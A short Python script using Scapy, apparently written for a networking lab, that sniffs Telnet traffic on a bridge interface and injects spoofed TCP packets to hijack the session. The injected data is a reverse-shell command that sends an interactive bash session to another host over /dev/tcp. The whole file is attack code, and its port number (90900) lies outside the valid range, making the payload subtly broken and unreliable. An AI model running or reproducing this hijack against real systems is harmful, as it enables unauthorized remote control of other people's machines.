#!/usr/bin/env python3
from scapy.all import *
def spoof_tcp(pkt):
    # Check if the packet has IP and TCP layers
    if IP in pkt and TCP in pkt:
        # Swap source and destination IP addresses
        new_ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)

        # Swap source and destination ports
        new_tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=pkt[TCP].ack+5, ack=pkt[TCP].seq+len(pkt[TCP].payload))

        data = "\r /bin/bash -i > /dev/tcp/10.0.9.1/90900<&1 2>&1 \r"
        # Build the new packet with swapped values
        spoof_pkt = new_ip/new_tcp/data
        ls(spoof_pkt)
        # Send the new packet
        sendp(spoof_pkt, iface= "br-d2236dcd530f", verbose=0)

# Start sniffing Telnet packets
pkt = sniff(iface="br-d2236dcd530f", filter='tcp and src host 10.9.0.5 and src port 23', prn=spoof_tcp)

